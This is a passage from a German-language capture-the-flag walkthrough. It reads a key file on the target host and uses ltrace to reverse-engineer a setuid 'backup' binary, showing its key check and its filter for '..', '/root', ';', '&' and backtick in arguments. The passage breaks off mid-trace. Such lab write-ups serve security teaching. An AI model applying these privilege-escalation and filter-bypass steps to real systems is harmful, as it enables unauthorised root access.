+</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+</span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 1<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>In Zeile 18 wird versucht <strong>/etc/myplace/keys</strong> zu lesen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>tom@node:/usr/local/bin$ cat /etc/myplace/keys
+</span></span><span style="display:flex;"><span>a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+</span></span><span style="display:flex;"><span>45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+</span></span><span style="display:flex;"><span>3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+</span></span></code></pre></div><p>Kopieren wir uns den Inhalt und erstellen bei unserer Maschine die Datei <strong>/etc/myplace/keys</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# mkdir /etc/myplace
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vi /etc/myplace/keys
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
+</span></span><span style="display:flex;"><span>45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
+</span></span><span style="display:flex;"><span>3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
+</span></span></code></pre></div><p>So jetzt erneut das Programm debuggen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ltrace ./backup -q arg2 arg3
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x80489fd, 4, 0xffaf3094, 0x80492c0 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>geteuid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;-q&#34;</span>, <span style="color:#e6db74">&#34;-q&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strncpy<span style="color:#f92672">(</span>0xffaf2f58, <span style="color:#e6db74">&#34;arg2&#34;</span>, 100<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2f58
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffaf2f41, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2f41
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffaf2f4d, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2f4d
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffaf2ed7, <span style="color:#e6db74">&#34;/e&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2ed7
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/e&#34;</span>, <span style="color:#e6db74">&#34;tc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc&#34;</span>, <span style="color:#e6db74">&#34;/m&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/m&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/m&#34;</span>, <span style="color:#e6db74">&#34;yp&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myp&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myp&#34;</span>, <span style="color:#e6db74">&#34;la&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/mypla&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/mypla&#34;</span>, <span style="color:#e6db74">&#34;ce&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace&#34;</span>, <span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>, <span style="color:#e6db74">&#34;ey&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>, <span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>
+</span></span><span style="display:flex;"><span>fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x8ef1160
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;</span>..., 1000, 0x8ef1160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2aef
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;</span>..., <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f&#34;</span>...<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;</span>..., 1000, 0x8ef1160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2aef
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;</span>..., <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e&#34;</span>...<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;</span>..., 1000, 0x8ef1160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2aef
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;</span>..., <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd25&#34;</span>...<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>, 1000, 0x8ef1160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffaf2aef
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span>, 1000, 0x8ef1160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+</span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 1<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>Das zweite Argument wird mit 3 verschiedenen Strings verglichen. Benutzen wir das Argument <strong>-s 100</strong> für <strong>ltrace</strong> um die Länge der anzuzeigenden Strings zu erhöhen.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ltrace -s <span style="color:#ae81ff">100</span> ./backup -q arg2 arg3
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x80489fd, 4, 0xffe7ff14, 0x80492c0 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>geteuid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;-q&#34;</span>, <span style="color:#e6db74">&#34;-q&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strncpy<span style="color:#f92672">(</span>0xffe7fdd8, <span style="color:#e6db74">&#34;arg2&#34;</span>, 100<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7fdd8
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffe7fdc1, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7fdc1
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffe7fdcd, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7fdcd
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffe7fd57, <span style="color:#e6db74">&#34;/e&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7fd57
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/e&#34;</span>, <span style="color:#e6db74">&#34;tc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc&#34;</span>, <span style="color:#e6db74">&#34;/m&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/m&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/m&#34;</span>, <span style="color:#e6db74">&#34;yp&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myp&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myp&#34;</span>, <span style="color:#e6db74">&#34;la&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/mypla&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/mypla&#34;</span>, <span style="color:#e6db74">&#34;ce&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace&#34;</span>, <span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>, <span style="color:#e6db74">&#34;ey&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>, <span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>
+</span></span><span style="display:flex;"><span>fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x8820160
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n&#34;</span>, 1000, 0x8820160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7f96f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n&#34;</span>, 1000, 0x8820160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7f96f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n&#34;</span>, 1000, 0x8820160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7f96f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>, 1000, 0x8820160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffe7f96f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg2&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span>, 1000, 0x8820160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>exit<span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+</span></span><span style="display:flex;"><span>+++ exited <span style="color:#f92672">(</span>status 1<span style="color:#f92672">)</span> +++
+</span></span></code></pre></div><p>Das 2. Argument wird also mit den Strings aus <strong>/etc/myplace/keys</strong> verglichen.</p>
+<p>Benutzen wir nun einen der 3 Strings aus <strong>/etc/myplace/keys</strong> als 2. Argument.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>root@kali:~# ltrace -s <span style="color:#ae81ff">100</span> ./backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 arg3
+</span></span><span style="display:flex;"><span>__libc_start_main<span style="color:#f92672">(</span>0x80489fd, 4, 0xffb1c9e4, 0x80492c0 &lt;unfinished ...&gt;
+</span></span><span style="display:flex;"><span>geteuid<span style="color:#f92672">()</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;-q&#34;</span>, <span style="color:#e6db74">&#34;-q&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strncpy<span style="color:#f92672">(</span>0xffb1c8a8, <span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span>, 100<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c8a8
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffb1c891, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c891
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffb1c89d, <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c89d
+</span></span><span style="display:flex;"><span>strcpy<span style="color:#f92672">(</span>0xffb1c827, <span style="color:#e6db74">&#34;/e&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c827
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/e&#34;</span>, <span style="color:#e6db74">&#34;tc&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc&#34;</span>, <span style="color:#e6db74">&#34;/m&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/m&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/m&#34;</span>, <span style="color:#e6db74">&#34;yp&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myp&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myp&#34;</span>, <span style="color:#e6db74">&#34;la&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/mypla&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/mypla&#34;</span>, <span style="color:#e6db74">&#34;ce&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace&#34;</span>, <span style="color:#e6db74">&#34;/k&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/k&#34;</span>, <span style="color:#e6db74">&#34;ey&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>
+</span></span><span style="display:flex;"><span>strcat<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/key&#34;</span>, <span style="color:#e6db74">&#34;s&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>
+</span></span><span style="display:flex;"><span>fopen<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/myplace/keys&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x9881160
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n&#34;</span>, 1000, 0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c43f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span>, <span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n&#34;</span>, 1000, 0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c43f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span>, <span style="color:#e6db74">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n&#34;</span>, 1000, 0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c43f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span>, <span style="color:#e6db74">&#34;3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>, 1000, 0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0xffb1c43f
+</span></span><span style="display:flex;"><span>strcspn<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span>, <span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strcmp<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>fgets<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;&#34;</span>, 1000, 0x9881160<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>strstr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;..&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil
+</span></span><span style="display:flex;"><span>strstr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#34;/root&#34;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil
+</span></span><span style="display:flex;"><span>strchr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#39;;&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil
+</span></span><span style="display:flex;"><span>strchr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#39;&amp;&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil
+</span></span><span style="display:flex;"><span>strchr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#e6db74">&#39;`&#39;</span><span style="color:#f92672">)</span> <span style="color:#f92672">=</span> nil
+</span></span><span style="display:flex;"><span>strchr<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;arg3&#34;</span>, <span style="color:#960050;background-color:#1e0010">&#39;</span>
